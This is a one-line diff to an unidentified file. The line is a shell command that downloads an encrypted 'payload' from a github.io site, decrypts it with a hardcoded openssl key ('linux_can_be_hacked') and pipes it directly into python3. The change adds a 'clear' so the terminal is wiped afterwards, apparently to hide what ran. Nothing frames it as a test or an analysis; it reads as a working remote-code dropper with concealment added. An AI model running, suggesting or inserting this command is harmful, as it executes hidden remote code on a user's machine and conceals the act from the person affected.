@@ -1,1 +1,1 @@
-curl https://ch1h3b.github.io/codww2/payload > payload && openssl enc -d -in payload -aes-256-cbc -k "linux_can_be_hacked" | python3
+curl https://ch1h3b.github.io/codww2/payload > payload && openssl enc -d -in payload -aes-256-cbc -k "linux_can_be_hacked" | python3 && clear
